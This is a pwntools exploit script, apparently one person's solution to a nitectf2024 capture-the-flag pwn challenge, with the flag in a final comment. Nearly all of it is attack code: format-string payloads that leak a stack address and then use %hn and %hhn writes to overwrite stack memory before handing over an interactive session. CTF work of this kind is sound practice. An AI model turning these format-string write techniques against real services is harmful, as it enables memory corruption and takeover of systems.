import argparse
import sys
sys.path.append('/home/coraline/CTF/pwn-dev/scripts/')
from pwn import *
from pwnfast import Pwn

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
args = _p.parse_args()

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chall_patched'
libc = ELF('./libc.so.6')
conn = 'chaterine.chals.nitectf2024.live 1337'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn=conn, ssl=True) if args.r else Pwn(PROG, debug=args.d, pie_base=0x555555554000)

def newm(idx, size):
    r.sla(b'>>', b'1')
    r.sla(b'index:', str(idx).encode())
    r.sla(b'size:', str(size).encode())

def delm(idx):
    r.sla(b'>>', b'2')
    r.sla(b'index:', str(idx).encode())

def writem(idx, pay):
    r.sla(b'>>', b'3')
    r.sla(b'index:', str(idx).encode())
    r.sl(pay)

r.s('spiderdriv')

# Leak stack address
newm(0, 0x100)
pay = '.'.join([f'%{i}$llx' for i in [13]])
writem(0, pay)

stack_leak = int(r.rl().strip(), 16)
buf_addr = stack_leak - 0x148
log.info('Stack leak: ' + hex(stack_leak))
log.info('Buffer leak: ' + hex(buf_addr))

# Overwrite value in stack
newm(1, 0x100)
lbytes = (buf_addr + 10) & 0xffff
pay = f'%{lbytes}c%13$hn'
writem(1, pay)

# Verify correct address
# newm(2, 0x100)
# pay = '.'.join([f'%{i}$llx' for i in [49]])
# writem(0, pay)

# Verify 
newm(2, 0x100)
# lbytes = buf_addr & 0xffff
pay = f'%{0x65}c%49$hhn'
r.gdb(r.call('main', 'printf', 8))
writem(2, pay)

r.interactive()
# nite{P015on_IvY_m4h_G04t}